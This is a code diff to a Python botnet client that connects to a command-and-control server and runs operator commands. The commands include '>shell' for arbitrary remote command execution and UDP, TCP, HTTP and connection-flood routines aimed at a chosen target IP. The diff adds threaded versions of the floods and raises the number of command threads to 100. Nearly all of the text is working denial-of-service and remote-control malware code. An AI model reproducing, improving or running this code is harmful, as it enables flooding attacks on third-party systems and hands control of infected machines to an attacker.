@@ -7,8 +7,8 @@ import threading
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-host = "" # IP for the bot to connect to
-port = 8888 # Port for the bot to connect to
+host = "localhost" # IP for the bot to connect to
+port = 8000 # Port for the bot to connect to
 
 connected = False
 
@@ -65,19 +65,29 @@ def system():
 			def commands():
 				msg = sock.recv(1024)
 				if ">killbots" in msg.lower():
-					sys.exit()
+					try:
+						sys.exit()
+					except:
+						pass
 
 				if ">shell" in msg.lower():
 					try:
-						shell = msg.split(" ")[1]
+						shell = msg[7:]
 						os.system(shell)
 					except:
 						pass
 
 				if ">udp" in msg.lower():
 					def udpflood():
-						import socket
 						try:
+							def udpflooder():
+								try:
+									udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
+									port = random.randint(1, 65535)
+									udpflood.sendto(package, (ip, port))
+								except:
+									pass
+
 							ip = msg.split(" ")[1]
 							psize = int(msg.split(" ")[2])
 							timer = int(float(msg.split(" ")[3]))
@@ -86,14 +96,14 @@ def system():
 
 							package = random._urandom(psize)
 
-							udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
-
 							print("Command Accepted!")
 							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
 
 							while True:
-								port = random.randint(1, 65535)
-								udpflood.sendto(package, (ip, port))
+								thread = threading.Thread(target=udpflooder)
+								thread.Deamon = True
+								thread.start()
+								thread.join()
 								if time.time() > timeout:
 									return
 						except:
@@ -102,8 +112,17 @@ def system():
 
 				if ">tcp" in msg.lower():
 					def tcpflood():
-						import socket
 						try:
+							def tcpflooder():
+								try:
+									tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+									tcpflood.connect((ip, 80))
+									port = random.randint(1, 65535)
+									tcpflood.sendto(package, (ip, port))
+									tcpflood.close()
+								except:
+									pass
+
 							ip = msg.split(" ")[1]
 							psize = int(msg.split(" ")[2])
 							timer = int(float(msg.split(" ")[3]))
@@ -116,11 +135,10 @@ def system():
 							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
 
 							while True:
-								tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-								tcpflood.connect((ip, 80))
-								port = random.randint(1, 65535)
-								tcpflood.sendto(package, (ip, port))
-								tcpflood.close()
+								thread = threading.Thread(target=tcpflooder)
+								thread.Deamon = True
+								thread.start()
+								thread.join()
 								if time.time() > timeout:
 									return
 						except:
@@ -131,13 +149,16 @@ def system():
 					def httpflood():
 						try:
 							def httpflooder():
-								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								resolvedHost = socket.gethostbyname(ip)
+								try:
+									sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+									resolvedHost = socket.gethostbyname(ip)
 
-								query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode('utf-8')
-								sock.connect((resolvedHost, 80))
-								sock.sendall(query)
-								sock.close()
+									query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode('utf-8')
+									sock.connect((resolvedHost, 80))
+									sock.sendall(query)
+									sock.close()
+								except:
+									pass
 
 							ip = msg.split(" ")[1]
 							threads = int(msg.split(" ")[2])
@@ -159,13 +180,43 @@ def system():
 						except:
 							pass
 					httpflood()
+
+				if ">cnc" in msg.lower():
+					def cncflood():
+						import socket
+						try:
+							def cncflooder():
+								try:
+									cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+									cnc.connect((ip, port))
+									cnc.close()
+								except:
+									pass
+
+							ip = msg.split(" ")[1]
+							port = int(msg.split(" ")[2])
+							amount = int(msg.split(" ")[3])
+
+							print("Command Accepted!")
+							print("CNC: Sent to %s on port %s %s times!" % (ip, port, amount))
+
+							for x in range(amount):
+								thread = threading.Thread(target=cncflooder)
+								thread.Deamon = True
+								thread.start()
+								thread.join()
+						except:
+							pass
+							
+					cncflood()
 			commands()
 			threads = []
-			for i in range(1):
+			for i in range(100):
 			    thread = threading.Thread(target=commands)
 			    threads.append(thread)
 			    thread.setDaemon(True)
 			    thread.start()
+			    
 		except socket.error:
 			connected = False
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
